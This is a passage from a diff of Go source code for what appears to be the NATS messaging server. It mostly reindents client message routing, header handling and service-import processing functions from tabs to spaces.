this inline as opposed to create a function (which otherwise has a measured\n+        // performance impact reported in our bench)\n+        var isGWRouted bool\n+        if c.kind != CLIENT {\n+                if atomic.LoadInt32(&c.acc.gwReplyMapping.check) > 0 {\n+                        c.acc.mu.RLock()\n+                        c.pa.subject, isGWRouted = c.acc.gwReplyMapping.get(c.pa.subject)\n+                        c.acc.mu.RUnlock()\n+                }\n+        } else if atomic.LoadInt32(&c.gwReplyMapping.check) > 0 {\n+                c.mu.Lock()\n+                c.pa.subject, isGWRouted = c.gwReplyMapping.get(c.pa.subject)\n+                c.mu.Unlock()\n+        }\n+\n+        // If we have an exported service and we are doing remote tracking, check this subject\n+        // to see if we need to report the latency.\n+        if c.rrTracking != nil {\n+                c.mu.Lock()\n+                rl := c.rrTracking.rmap[string(c.pa.subject)]\n+                if rl != nil {\n+                        delete(c.rrTracking.rmap, string(c.pa.subject))\n+                }\n+                c.mu.Unlock()\n+\n+                if rl != nil {\n+                        sl := &rl.M2\n+                        // Fill this in and send it off to the other side.\n+                        sl.Status = 200\n+                        sl.Responder = c.getClientInfo(true)\n+                        sl.ServiceLatency = time.Since(sl.RequestStart) - sl.Responder.RTT\n+                        sl.TotalLatency = sl.ServiceLatency + sl.Responder.RTT\n+                        sanitizeLatencyMetric(sl)\n+                        lsub := remoteLatencySubjectForResponse(c.pa.subject)\n+                        c.srv.sendInternalAccountMsg(nil, lsub, rl) // Send to SYS account\n+                }\n+        }\n+\n+        // If the subject was converted to the gateway routed subject, then handle it now\n+        // and be done with the rest of this function.\n+        if isGWRouted {\n+                c.handleGWReplyMap(msg)\n+                return true, false\n+        }\n+\n+        // Match the subscriptions. We will use our own L1 map if\n+        // it's still valid, avoiding contention on the shared sublist.\n+        var r *SublistResult\n+        var ok bool\n+\n+        genid := atomic.LoadUint64(&c.acc.sl.genid)\n+        if genid == c.in.genid && c.in.results != nil {\n+                r, ok = c.in.results[string(c.pa.subject)]\n+        } else {\n+                // Reset our L1 completely.\n+                c.in.results = make(map[string]*SublistResult)\n+                c.in.genid = genid\n+        }\n+\n+        // Go back to the sublist data structure.\n+        if !ok {\n+                r = c.acc.sl.Match(string(c.pa.subject))\n+                c.in.results[string(c.pa.subject)] = r\n+                // Prune the results cache. Keeps us from unbounded growth. Random delete.\n+                if len(c.in.results) > maxResultCacheSize {\n+                        n := 0\n+                        for subject := range c.in.results {\n+                                delete(c.in.results, subject)\n+                                if n++; n > pruneSize {\n+                                        break\n+                                }\n+                        }\n+                }\n+        }\n+\n+        // Indication if we attempted to deliver the message to anyone.\n+        var didDeliver bool\n+        var qnames [][]byte\n+\n+        // Check for no interest, short circuit if so.\n+        // This is the fanout scale.\n+        if len(r.psubs)+len(r.qsubs) > 0 {\n+                flag := pmrNoFlag\n+                // If there are matching queue subs and we are in gateway mode,\n+                // we need to keep track of the queue names the messages are\n+                // delivered to. When sending to the GWs, the RMSG will include\n+                // those names so that the remote clusters do not deliver messages\n+                // to their queue subs of the same names.\n+                if len(r.qsubs) > 0 && c.srv.gateway.enabled &&\n+                        atomic.LoadInt64(&c.srv.gateway.totalQSubs) > 0 {\n+                        flag |= pmrCollectQueueNames\n+                }\n+                didDeliver, qnames = c.processMsgResults(c.acc, r, msg, c.pa.deliver, c.pa.subject, c.pa.reply, flag)\n+        }\n+\n+        // Now deal with gateways\n+        if c.srv.gateway.enabled {\n+                reply := c.pa.reply\n+                if len(c.pa.deliver) > 0 && c.kind == JETSTREAM && len(c.pa.reply) > 0 {\n+                        reply = append(reply, '@')\n+                        reply = append(reply, c.pa.deliver...)\n+                }\n+                didDeliver = c.sendMsgToGateways(c.acc, msg, c.pa.subject, reply, qnames) || didDeliver\n+        }\n+\n+        // Check to see if we did not deliver to anyone and the client has a reply subject set\n+        // and wants notification of no_responders.\n+        if !didDeliver && len(c.pa.reply) > 0 {\n+                c.mu.Lock()\n+                if c.opts.NoResponders {\n+                        if sub := c.subForReply(c.pa.reply); sub != nil {\n+                                proto := fmt.Sprintf(\"HMSG %s %s 16 16\\r\\nNATS/1.0 503\\r\\n\\r\\n\\r\\n\", c.pa.reply, sub.sid)\n+                                c.queueOutbound([]byte(proto))\n+                                c.addToPCD(c)\n+                        }\n+                }\n+                c.mu.Unlock()\n+        }\n+\n+        return didDeliver, false\n }\n \n // Return the subscription for this reply subject. Only look at normal subs for this client.\n func (c *client) subForReply(reply []byte) *subscription {\n-\tr := c.acc.sl.Match(string(reply))\n-\tfor _, sub := range r.psubs {\n-\t\tif sub.client == c {\n-\t\t\treturn sub\n-\t\t}\n-\t}\n-\treturn nil\n+        r := c.acc.sl.Match(string(reply))\n+        for _, sub := range r.psubs {\n+                if sub.client == c {\n+                        return sub\n+                }\n+        }\n+        return nil\n }\n \n // This is invoked knowing that c.pa.subject has been set to the gateway routed subject.\n // This function will send the message to possibly LEAFs and directly back to the origin\n // gateway.\n func (c *client) handleGWReplyMap(msg []byte) bool {\n-\t// Check for leaf nodes\n-\tif c.srv.gwLeafSubs.Count() > 0 {\n-\t\tif r := c.srv.gwLeafSubs.Match(string(c.pa.subject)); len(r.psubs) > 0 {\n-\t\t\tc.processMsgResults(c.acc, r, msg, c.pa.deliver, c.pa.subject, c.pa.reply, pmrNoFlag)\n-\t\t}\n-\t}\n-\tif c.srv.gateway.enabled {\n-\t\treply := c.pa.reply\n-\t\tif len(c.pa.deliver) > 0 && c.kind == JETSTREAM && len(c.pa.reply) > 0 {\n-\t\t\treply = append(reply, '@')\n-\t\t\treply = append(reply, c.pa.deliver...)\n-\t\t}\n-\t\tc.sendMsgToGateways(c.acc, msg, c.pa.subject, reply, nil)\n-\t}\n-\treturn true\n+        // Check for leaf nodes\n+        if c.srv.gwLeafSubs.Count() > 0 {\n+                if r := c.srv.gwLeafSubs.Match(string(c.pa.subject)); len(r.psubs) > 0 {\n+                        c.processMsgResults(c.acc, r, msg, c.pa.deliver, c.pa.subject, c.pa.reply, pmrNoFlag)\n+                }\n+        }\n+        if c.srv.gateway.enabled {\n+                reply := c.pa.reply\n+                if len(c.pa.deliver) > 0 && c.kind == JETSTREAM && len(c.pa.reply) > 0 {\n+                        reply = append(reply, '@')\n+                        reply = append(reply, c.pa.deliver...)\n+                }\n+                c.sendMsgToGateways(c.acc, msg, c.pa.subject, reply, nil)\n+        }\n+        return true\n }\n \n // Used to setup the response map for a service import request that has a reply subject.\n func (c *client) setupResponseServiceImport(acc *Account, si *serviceImport, tracking bool, header http.Header) *serviceImport {\n-\trsi := si.acc.addRespServiceImport(acc, string(c.pa.reply), si, tracking, header)\n-\tif si.latency != nil {\n-\t\tif c.rtt == 0 {\n-\t\t\t// We have a service import that we are tracking but have not established RTT.\n-\t\t\tc.sendRTTPing()\n-\t\t}\n-\t\tsi.acc.mu.Lock()\n-\t\trsi.rc = c\n-\t\tsi.acc.mu.Unlock()\n-\t}\n-\treturn rsi\n+        rsi := si.acc.addRespServiceImport(acc, string(c.pa.reply), si, tracking, header)\n+        if si.latency != nil {\n+                if c.rtt == 0 {\n+                        // We have a service import that we are tracking but have not established RTT.\n+                        c.sendRTTPing()\n+                }\n+                si.acc.mu.Lock()\n+                rsi.rc = c\n+                si.acc.mu.Unlock()\n+        }\n+        return rsi\n }\n \n // Will remove a header if present.\n func removeHeaderIfPresent(hdr []byte, key string) []byte {\n-\tstart := bytes.Index(hdr, []byte(key))\n-\t// key can't be first and we want to check that it is preceded by a '\\n'\n-\tif start < 1 || hdr[start-1] != '\\n' {\n-\t\treturn hdr\n-\t}\n-\tindex := start + len(key)\n-\tif index >= len(hdr) || hdr[index] != ':' {\n-\t\treturn hdr\n-\t}\n-\tend := bytes.Index(hdr[start:], []byte(_CRLF_))\n-\tif end < 0 {\n-\t\treturn hdr\n-\t}\n-\thdr = append(hdr[:start], hdr[start+end+len(_CRLF_):]...)\n-\tif len(hdr) <= len(emptyHdrLine) {\n-\t\treturn nil\n-\t}\n-\treturn hdr\n+        start := bytes.Index(hdr, []byte(key))\n+        // key can't be first and we want to check that it is preceded by a '\\n'\n+        if start < 1 || hdr[start-1] != '\\n' {\n+                return hdr\n+        }\n+        index := start + len(key)\n+        if index >= len(hdr) || hdr[index] != ':' {\n+                return hdr\n+        }\n+        end := bytes.Index(hdr[start:], []byte(_CRLF_))\n+        if end < 0 {\n+                return hdr\n+        }\n+        hdr = append(hdr[:start], hdr[start+end+len(_CRLF_):]...)\n+        if len(hdr) <= len(emptyHdrLine) {\n+                return nil\n+        }\n+        return hdr\n }\n \n // Generate a new header based on optional original header and key value.\n // More used in JetStream layers.\n func genHeader(hdr []byte, key, value string) []byte {\n-\tvar bb bytes.Buffer\n-\tif len(hdr) > LEN_CR_LF {\n-\t\tbb.Write(hdr[:len(hdr)-LEN_CR_LF])\n-\t} else {\n-\t\tbb.WriteString(hdrLine)\n-\t}\n-\thttp.Header{key: []string{value}}.Write(&bb)\n-\tbb.WriteString(CR_LF)\n-\treturn bb.Bytes()\n+        var bb bytes.Buffer\n+        if len(hdr) > LEN_CR_LF {\n+                bb.Write(hdr[:len(hdr)-LEN_CR_LF])\n+        } else {\n+                bb.WriteString(hdrLine)\n+        }\n+        http.Header{key: []string{value}}.Write(&bb)\n+        bb.WriteString(CR_LF)\n+        return bb.Bytes()\n }\n \n // This will set a header for the message.\n@@ -3759,796 +3761,796 @@ func genHeader(hdr []byte, key, value string) []byte {\n // from the inbound go routine. We will update the pubArgs.\n // This will replace any previously set header and not add to it per normal spec.\n func (c *client) setHeader(key, value string, msg []byte) []byte {\n-\tvar bb bytes.Buffer\n-\tvar omi int\n-\t// Write original header if present.\n-\tif c.pa.hdr > LEN_CR_LF {\n-\t\tomi = c.pa.hdr\n-\t\thdr := removeHeaderIfPresent(msg[:c.pa.hdr-LEN_CR_LF], key)\n-\t\tif len(hdr) == 0 {\n-\t\t\tbb.WriteString(hdrLine)\n-\t\t} else {\n-\t\t\tbb.Write(hdr)\n-\t\t}\n-\t} else {\n-\t\tbb.WriteString(hdrLine)\n-\t}\n-\thttp.Header{key: []string{value}}.Write(&bb)\n-\tbb.WriteString(CR_LF)\n-\tnhdr := bb.Len()\n-\t// Put the original message back.\n-\t// FIXME(dlc) - This is inefficient.\n-\tbb.Write(msg[omi:])\n-\tnsize := bb.Len() - LEN_CR_LF\n-\t// MQTT producers don't have CRLF, so add it back.\n-\tif c.isMqtt() {\n-\t\tnsize += LEN_CR_LF\n-\t}\n-\t// Update pubArgs\n-\t// If others will use this later we need to save and restore original.\n-\tc.pa.hdr = nhdr\n-\tc.pa.size = nsize\n-\tc.pa.hdb = []byte(strconv.Itoa(nhdr))\n-\tc.pa.szb = []byte(strconv.Itoa(nsize))\n-\treturn bb.Bytes()\n+        var bb bytes.Buffer\n+        var omi int\n+        // Write original header if present.\n+        if c.pa.hdr > LEN_CR_LF {\n+                omi = c.pa.hdr\n+                hdr := removeHeaderIfPresent(msg[:c.pa.hdr-LEN_CR_LF], key)\n+                if len(hdr) == 0 {\n+                        bb.WriteString(hdrLine)\n+                } else {\n+                        bb.Write(hdr)\n+                }\n+        } else {\n+                bb.WriteString(hdrLine)\n+        }\n+        http.Header{key: []string{value}}.Write(&bb)\n+        bb.WriteString(CR_LF)\n+        nhdr := bb.Len()\n+        // Put the original message back.\n+        // FIXME(dlc) - This is inefficient.\n+        bb.Write(msg[omi:])\n+        nsize := bb.Len() - LEN_CR_LF\n+        // MQTT producers don't have CRLF, so add it back.\n+        if c.isMqtt() {\n+                nsize += LEN_CR_LF\n+        }\n+        // Update pubArgs\n+        // If others will use this later we need to save and restore original.\n+        c.pa.hdr = nhdr\n+        c.pa.size = nsize\n+        c.pa.hdb = []byte(strconv.Itoa(nhdr))\n+        c.pa.szb = []byte(strconv.Itoa(nsize))\n+        return bb.Bytes()\n }\n \n // Will return the value for the header denoted by key or nil if it does not exists.\n // This function ignores errors and tries to achieve speed and no additional allocations.\n func getHeader(key string, hdr []byte) []byte {\n-\tif len(hdr) == 0 {\n-\t\treturn nil\n-\t}\n-\tindex := bytes.Index(hdr, []byte(key))\n-\tif index < 0 {\n-\t\treturn nil\n-\t}\n-\tindex += len(key)\n-\tif index >= len(hdr) {\n-\t\treturn nil\n-\t}\n-\tif hdr[index] != ':' {\n-\t\treturn nil\n-\t}\n-\tindex++\n-\n-\tvar value []byte\n-\thdrLen := len(hdr)\n-\tfor hdr[index] == ' ' && index < hdrLen {\n-\t\tindex++\n-\t}\n-\tfor index < hdrLen {\n-\t\tif hdr[index] == '\\r' && index < hdrLen-1 && hdr[index+1] == '\\n' {\n-\t\t\tbreak\n-\t\t}\n-\t\tvalue = append(value, hdr[index])\n-\t\tindex++\n-\t}\n-\treturn value\n+        if len(hdr) == 0 {\n+                return nil\n+        }\n+        index := bytes.Index(hdr, []byte(key))\n+        if index < 0 {\n+                return nil\n+        }\n+        index += len(key)\n+        if index >= len(hdr) {\n+                return nil\n+        }\n+        if hdr[index] != ':' {\n+                return nil\n+        }\n+        index++\n+\n+        var value []byte\n+        hdrLen := len(hdr)\n+        for hdr[index] == ' ' && index < hdrLen {\n+                index++\n+        }\n+        for index < hdrLen {\n+                if hdr[index] == '\\r' && index < hdrLen-1 && hdr[index+1] == '\\n' {\n+                        break\n+                }\n+                value = append(value, hdr[index])\n+                index++\n+        }\n+        return value\n }\n \n // processServiceImport is an internal callback when a subscription matches an imported service\n // from another account. This includes response mappings as well.\n func (c *client) processServiceImport(si *serviceImport, acc *Account, msg []byte) {\n-\t// If we are a GW and this is not a direct serviceImport ignore.\n-\tisResponse := si.isRespServiceImport()\n-\tif (c.kind == GATEWAY || c.kind == ROUTER) && !isResponse {\n-\t\treturn\n-\t}\n-\t// If we are here and we are a serviceImport response make sure we are not matching back\n-\t// to the import/export pair that started the request. If so ignore.\n-\tif isResponse && c.pa.psi != nil && c.pa.psi.se == si.se {\n-\t\treturn\n-\t}\n-\n-\tacc.mu.RLock()\n-\tshouldReturn := si.invalid || acc.sl == nil\n-\tcheckJSGetNext := !isResponse && si.to == jsAllAPI && strings.HasPrefix(string(c.pa.subject), jsRequestNextPre)\n-\tacc.mu.RUnlock()\n-\n-\t// We have a special case where JetStream pulls in all service imports through one export.\n-\t// However the GetNext for consumers is a no-op and causes buildups of service imports,\n-\t// response service imports and rrMap entries which all will need to simply expire.\n-\t// TODO(dlc) - Come up with something better.\n-\tif checkJSGetNext && si.se != nil && si.se.acc == c.srv.SystemAccount() {\n-\t\tshouldReturn = true\n-\t}\n-\n-\t// Check for short circuit return.\n-\tif shouldReturn {\n-\t\treturn\n-\t}\n-\n-\tvar nrr []byte\n-\tvar rsi *serviceImport\n-\n-\t// Check if there is a reply present and set up a response.\n-\ttracking, headers := shouldSample(si.latency, c)\n-\tif len(c.pa.reply) > 0 {\n-\t\t// Special case for now, need to formalize.\n-\t\t// TODO(dlc) - Formalize as a service import option for reply rewrite.\n-\t\t// For now we can't do $JS.ACK since that breaks pull consumers across accounts.\n-\t\tif !bytes.HasPrefix(c.pa.reply, []byte(jsAckPre)) {\n-\t\t\tif rsi = c.setupResponseServiceImport(acc, si, tracking, headers); rsi != nil {\n-\t\t\t\tnrr = []byte(rsi.from)\n-\t\t\t}\n-\t\t} else {\n-\t\t\t// This only happens when we do a pull subscriber that trampolines through another account.\n-\t\t\t// Normally this code is not called.\n-\t\t\tnrr = c.pa.reply\n-\t\t}\n-\t} else if !isResponse && si.latency != nil && tracking {\n-\t\t// Check to see if this was a bad request with no reply and we were supposed to be tracking.\n-\t\tsi.acc.sendBadRequestTrackingLatency(si, c, headers)\n-\t}\n-\n-\t// Send tracking info here if we are tracking this response.\n-\t// This is always a response.\n-\tvar didSendTL bool\n-\tif si.tracking && !si.didDeliver {\n-\t\t// Stamp that we attempted delivery.\n-\t\tsi.didDeliver = true\n-\t\tdidSendTL = acc.sendTrackingLatency(si, c)\n-\t}\n-\n-\t// Pick correct \"to\" subject. If we matched on a wildcard use the literal publish subject.\n-\tto, subject := si.to, string(c.pa.subject)\n-\n-\tif si.tr != nil {\n-\t\t// FIXME(dlc) - This could be slow, may want to look at adding cache to bare transforms?\n-\t\tto, _ = si.tr.transformSubject(subject)\n-\t} else if si.usePub {\n-\t\tto = subject\n-\t}\n-\n-\t// Copy our pubArg since this gets modified as we process the service import itself.\n-\tpacopy := c.pa\n-\n-\t// Now check to see if this account has mappings that could affect the service import.\n-\t// Can't use non-locked trick like in processInboundClientMsg, so just call into selectMappedSubject\n-\t// so we only lock once.\n-\tif nsubj, changed := si.acc.selectMappedSubject(to); changed {\n-\t\tc.pa.mapped = []byte(to)\n-\t\tto = nsubj\n-\t}\n-\n-\t// Set previous service import to detect chaining.\n-\thadPrevSi, share := c.pa.psi != nil, si.share\n-\tif hadPrevSi {\n-\t\tshare = c.pa.psi.share\n-\t}\n-\tc.pa.psi = si\n-\n-\t// Place our client info for the request in the original message.\n-\t// This will survive going across routes, etc.\n-\tif !isResponse {\n-\t\tvar ci *ClientInfo\n-\t\tif hadPrevSi && c.pa.hdr >= 0 {\n-\t\t\tvar cis ClientInfo\n-\t\t\tif err := json.Unmarshal(getHeader(ClientInfoHdr, msg[:c.pa.hdr]), &cis); err == nil {\n-\t\t\t\tci = &cis\n-\t\t\t\tci.Service = acc.Name\n-\t\t\t\t// Check if we are moving into a share details account from a non-shared\n-\t\t\t\t// and add in server and cluster details.\n-\t\t\t\tif !share && si.share {\n-\t\t\t\t\tc.addServerAndClusterInfo(ci)\n-\t\t\t\t}\n-\t\t\t}\n-\t\t} else if c.kind != LEAF || c.pa.hdr < 0 || len(getHeader(ClientInfoHdr, msg[:c.pa.hdr])) == 0 {\n-\t\t\tci = c.getClientInfo(share)\n-\t\t} else if c.kind == LEAF && si.share {\n-\t\t\t// We have a leaf header here for ci, augment as above.\n-\t\t\tci = c.getClientInfo(si.share)\n-\t\t}\n-\t\t// Set clientInfo if present.\n-\t\tif ci != nil {\n-\t\t\tif b, _ := json.Marshal(ci); b != nil {\n-\t\t\t\tmsg = c.setHeader(ClientInfoHdr, string(b), msg)\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// Set our optional subject(to) and reply.\n-\tif !isResponse && to != subject {\n-\t\tc.pa.subject = []byte(to)\n-\t}\n-\tc.pa.reply = nrr\n-\n-\t// FIXME(dlc) - Do L1 cache trick like normal client?\n-\trr := si.acc.sl.Match(to)\n-\n-\t// If we are a route or gateway or leafnode and this message is flipped to a queue subscriber we\n-\t// need to handle that since the processMsgResults will want a queue filter.\n-\tflags := pmrMsgImportedFromService\n-\tif c.kind == GATEWAY || c.kind == ROUTER || c.kind == LEAF {\n-\t\tflags |= pmrIgnoreEmptyQueueFilter\n-\t}\n-\n-\t// We will be calling back into processMsgResults since we are now being called as a normal sub.\n-\t// We need to take care of the c.in.rts, so save off what is there and use a local version. We\n-\t// will put back what was there after.\n-\n-\torts := c.in.rts\n-\n-\tvar lrts [routeTargetInit]routeTarget\n-\tc.in.rts = lrts[:0]\n-\n-\tvar didDeliver bool\n-\n-\t// If this is not a gateway connection but gateway is enabled,\n-\t// try to send this converted message to all gateways.\n-\tif c.srv.gateway.enabled {\n-\t\tflags |= pmrCollectQueueNames\n-\t\tvar queues [][]byte\n-\t\tdidDeliver, queues = c.processMsgResults(si.acc, rr, msg, c.pa.deliver, []byte(to), nrr, flags)\n-\t\tdidDeliver = c.sendMsgToGateways(si.acc, msg, []byte(to), nrr, queues) || didDeliver\n-\t} else {\n-\t\tdidDeliver, _ = c.processMsgResults(si.acc, rr, msg, c.pa.deliver, []byte(to), nrr, flags)\n-\t}\n-\n-\t// Restore to original values.\n-\tc.in.rts = orts\n-\tc.pa = pacopy\n-\n-\t// Determine if we should remove this service import. This is for response service imports.\n-\t// We will remove if we did not deliver, or if we are a response service import and we are\n-\t// a singleton, or we have an EOF message.\n-\tshouldRemove := !didDeliver || (isResponse && (si.rt == Singleton || len(msg) == LEN_CR_LF))\n-\t// If we are tracking and we did not actually send the latency info we need to suppress the removal.\n-\tif si.tracking && !didSendTL {\n-\t\tshouldRemove = false\n-\t}\n-\t// If we are streamed or chunked we need to update our timestamp to avoid cleanup.\n-\tif si.rt != Singleton && didDeliver {\n-\t\tacc.mu.Lock()\n-\t\tsi.ts = time.Now().UnixNano()\n-\t\tacc.mu.Unlock()\n-\t}\n-\n-\t// Cleanup of a response service import\n-\tif shouldRemove {\n-\t\treason := rsiOk\n-\t\tif !didDeliver {\n-\t\t\treason = rsiNoDelivery\n-\t\t}\n-\t\tif isResponse {\n-\t\t\tacc.removeRespServiceImport(si, reason)\n-\t\t} else {\n-\t\t\t// This is a main import and since we could not even deliver to the exporting account\n-\t\t\t// go ahead and remove the respServiceImport we created above.\n-\t\t\tsi.acc.removeRespServiceImport(rsi, reason)\n-\t\t}\n-\t}\n+        // If we are a GW and this is not a direct serviceImport ignore.\n+        isResponse := si.isRespServiceImport()\n+        if (c.kind == GATEWAY || c.kind == ROUTER) && !isResponse {\n+                return\n+        }\n+        // If we are here and we are a serviceImport response make sure we are not matching back\n+        // to the import/export pair that started the request. If so ignore.\n+        if isResponse && c.pa.psi != nil && c.pa.psi.se == si.se {\n+                return\n+        }\n+\n+        acc.mu.RLock()\n+        shouldReturn := si.invalid || acc.sl == nil\n+        checkJSGetNext := !isResponse && si.to == jsAllAPI && strings.HasPrefix(string(c.pa.subject), jsRequestNextPre)\n+        acc.mu.RUnlock()\n+\n+        // We have a special case where JetStream pulls in all service imports through one export.\n+        // However the GetNext for consumers is a no-op and causes buildups of service imports,\n+        // response service imports and rrMap entries which all will need to simply expire.\n+        // TODO(dlc) - Come up with something better.\n+        if checkJSGetNext && si.se != nil && si.se.acc == c.srv.SystemAccount() {\n+                shouldReturn = true\n+        }\n+\n+        // Check for short circuit return.\n+        if shouldReturn {\n+                return\n+        }\n+\n+        var nrr []byte\n+        var rsi *serviceImport\n+\n+        // Check if there is a reply present and set up a response.\n+        tracking, headers := shouldSample(si.latency, c)\n+        if len(c.pa.reply) > 0 {\n+                // Special case for now, need to formalize.\n+                // TODO(dlc) - Formalize as a service import option for reply rewrite.\n+                // For now we can't do $JS.ACK since that breaks pull consumers across accounts.\n+                if !bytes.HasPrefix(c.pa.reply, []byte(jsAckPre)) {\n+                        if rsi = c.setupResponseServiceImport(acc, si, tracking, headers); rsi != nil {\n+                                nrr = []byte(rsi.from)\n+                        }\n+                } else {\n+                        // This only happens when we do a pull subscriber that trampolines through another account.\n+                        // Normally this code is not called.\n+                        nrr = c.pa.reply\n+                }\n+        } else if !isResponse && si.latency != nil && tracking {\n+                // Check to see if this was a bad request with no reply and we were supposed to be tracking.\n+                si.acc.sendBadRequestTrackingLatency(si, c, headers)\n+        }\n+\n+        // Send tracking info here if we are tracking this response.\n+        // This is always a response.\n+        var didSendTL bool\n+        if si.tracking && !si.didDeliver {\n+                // Stamp that we attempted delivery.\n+                si.didDeliver = true\n+                didSendTL = acc.sendTrackingLatency(si, c)\n+        }\n+\n+        // Pick correct \"to\" subject. If we matched on a wildcard use the literal publish subject.\n+        to, subject := si.to, string(c.pa.subject)\n+\n+        if si.tr != nil {\n+                // FIXME(dlc) - This could be slow, may want to look at adding cache to bare transforms?\n+                to, _ = si.tr.transformSubject(subject)\n+        } else if si.usePub {\n+                to = subject\n+        }\n+\n+        // Copy our pubArg since this gets modified as we process the service import itself.\n+        pacopy := c.pa\n+\n+        // Now check to see if this account has mappings that could affect the service import.\n+        // Can't use non-locked trick like in processInboundClientMsg, so just call into selectMappedSubject\n+        // so we only lock once.\n+        if nsubj, changed := si.acc.selectMappedSubject(to); changed {\n+                c.pa.mapped = []byte(to)\n+                to = nsubj\n+        }\n+\n+        // Set previous service import to detect chaining.\n+        hadPrevSi, share := c.pa.psi != nil, si.share\n+        if hadPrevSi {\n+                share = c.pa.psi.share\n+        }\n+        c.pa.psi = si\n+\n+        // Place our client info for the request in the original message.\n+        // This will survive going across routes, etc.\n+        if !isResponse {\n+                var ci *ClientInfo\n+                if hadPrevSi && c.pa.hdr >= 0 {\n+                        var cis ClientInfo\n+                        if err := json.Unmarshal(getHeader(ClientInfoHdr, msg[:c.pa.hdr]), &cis); err == nil {\n+                                ci = &cis\n+                                ci.Service = acc.Name\n+                                // Check if we are moving into a share details account from a non-shared\n+                                // and add in server and cluster details.\n+                                if !share && si.share {\n+                                        c.addServerAndClusterInfo(ci)\n+                                }\n+                        }\n+                } else if c.kind != LEAF || c.pa.hdr < 0 || len(getHeader(ClientInfoHdr, msg[:c.pa.hdr])) == 0 {\n+                        ci = c.getClientInfo(share)\n+                } else if c.kind == LEAF && si.share {\n+                        // We have a leaf header here for ci, augment as above.\n+                        ci = c.getClientInfo(si.share)\n+                }\n+                // Set clientInfo if present.\n+                if ci != nil {\n+                        if b, _ := json.Marshal(ci); b != nil {\n+                                msg = c.setHeader(ClientInfoHdr, string(b), msg)\n+                        }\n+                }\n+        }\n+\n+        // Set our optional subject(to) and reply.\n+        if !isResponse && to != subject {\n+                c.pa.subject = []byte(to)\n+        }\n+        c.pa.reply = nrr\n+\n+        // FIXME(dlc) - Do L1 cache trick like normal client?\n+        rr := si.acc.sl.Match(to)\n+\n+        // If we are a route or gateway or leafnode and this message is flipped to a queue subscriber we\n+        // need to handle that since the processMsgResults will want a queue filter.\n+        flags := pmrMsgImportedFromService\n+        if c.kind == GATEWAY || c.kind == ROUTER || c.kind == LEAF {\n+                flags |= pmrIgnoreEmptyQueueFilter\n+        }\n+\n+        // We will be calling back into processMsgResults since we are now being called as a normal sub.\n+        // We need to take care of the c.in.rts, so save off what is there and use a local version. We\n+        // will put back what was there after.\n+\n+        orts := c.in.rts\n+\n+        var lrts [routeTargetInit]routeTarget\n+        c.in.rts = lrts[:0]\n+\n+        var didDeliver bool\n+\n+        // If this is not a gateway connection but gateway is enabled,\n+        // try to send this converted message to all gateways.\n+        if c.srv.gateway.enabled {\n+                flags |= pmrCollectQueueNames\n+                var queues [][]byte\n+                didDeliver, queues = c.processMsgResults(si.acc, rr, msg, c.pa.deliver, []byte(to), nrr, flags)\n+                didDeliver = c.sendMsgToGateways(si.acc, msg, []byte(to), nrr, queues) || didDeliver\n+        } else {\n+                didDeliver, _ = c.processMsgResults(si.acc, rr, msg, c.pa.deliver, []byte(to), nrr, flags)\n+        }\n+\n+        // Restore to original values.\n+        c.in.rts = orts\n+        c.pa = pacopy\n+\n+        // Determine if we should remove this service import. This is for response service imports.\n+        // We will remove if we did not deliver, or if we are a response service import and we are\n+        // a singleton, or we have an EOF message.\n+        shouldRemove := !didDeliver || (isResponse && (si.rt == Singleton || len(msg) == LEN_CR_LF))\n+        // If we are tracking and we did not actually send the latency info we need to suppress the removal.\n+        if si.tracking && !didSendTL {\n+                shouldRemove = false\n+        }\n+        // If we are streamed or chunked we need to update our timestamp to avoid cleanup.\n+        if si.rt != Singleton && didDeliver {\n+                acc.mu.Lock()\n+                si.ts = time.Now().UnixNano()\n+                acc.mu.Unlock()\n+        }\n+\n+        // Cleanup of a response service import\n+        if shouldRemove {\n+                reason := rsiOk\n+                if !didDeliver {\n+                        reason = rsiNoDelivery\n+                }\n+                if isResponse {\n+                        acc.removeRespServiceImport(si, reason)\n+                } else {\n+                        // This is a main import and since we could not even deliver to the exporting account\n+                        // go ahead and remove the respServiceImport we created above.\n+                        si.acc.removeRespServiceImport(rsi, reason)\n+                }\n+        }\n }\n \n func (c *client) addSubToRouteTargets(sub *subscription) {\n-\tif c.in.rts == nil {\n-\t\tc.in.rts = make([]routeTarget, 0, routeTargetInit)\n-\t}\n-\n-\tfor i := range c.in.rts {\n-\t\trt := &c.in.rts[i]\n-\t\tif rt.sub.client == sub.client {\n-\t\t\tif sub.queue != nil {\n-\t\t\t\trt.qs = append(rt.qs, sub.queue...)\n-\t\t\t\trt.qs = append(rt.qs, ' ')\n-\t\t\t}\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\tvar rt *routeTarget\n-\tlrts := len(c.in.rts)\n-\n-\t// If we are here we do not have the sub yet in our list\n-\t// If we have to grow do so here.\n-\tif lrts == cap(c.in.rts) {\n-\t\tc.in.rts = append(c.in.rts, routeTarget{})\n-\t}\n-\n-\tc.in.rts = c.in.rts[:lrts+1]\n-\trt = &c.in.rts[lrts]\n-\trt.sub = sub\n-\trt.qs = rt._qs[:0]\n-\tif sub.queue != nil {\n-\t\trt.qs = append(rt.qs, sub.queue...)\n-\t\trt.qs = append(rt.qs, ' ')\n-\t}\n+        if c.in.rts == nil {\n+                c.in.rts = make([]routeTarget, 0, routeTargetInit)\n+        }\n+\n+        for i := range c.in.rts {\n+                rt := &c.in.rts[i]\n+                if rt.sub.client == sub.client {\n+                        if sub.queue != nil {\n+                                rt.qs = append(rt.qs, sub.queue...)\n+                                rt.qs = append(rt.qs, ' ')\n+                        }\n+                        return\n+                }\n+        }\n+\n+        var rt *routeTarget\n+        lrts := len(c.in.rts)\n+\n+        // If we are here we do not have the sub yet in our list\n+        // If we have to grow do so here.\n+        if lrts == cap(c.in.rts) {\n+                c.in.rts = append(c.in.rts, routeTarget{})\n+        }\n+\n+        c.in.rts = c.in.rts[:lrts+1]\n+        rt = &c.in.rts[lrts]\n+        rt.sub = sub\n+        rt.qs = rt._qs[:0]\n+        if sub.queue != nil {\n+                rt.qs = append(rt.qs, sub.queue...)\n+                rt.qs = append(rt.qs, ' ')\n+        }\n }\n \n // This processes the sublist results for a given message.\n // Returns if the message was delivered to at least target and queue filters.\n func (c *client) processMsgResults(acc *Account, r *SublistResult, msg, deliver, subject, reply []byte, flags int) (bool, [][]byte) {\n-\t// For sending messages across routes and leafnodes.\n-\t// Reset if we have one since we reuse this data structure.\n-\tif c.in.rts != nil {\n-\t\tc.in.rts = c.in.rts[:0]\n-\t}\n-\n-\tvar rplyHasGWPrefix bool\n-\tvar creply = reply\n-\n-\t// 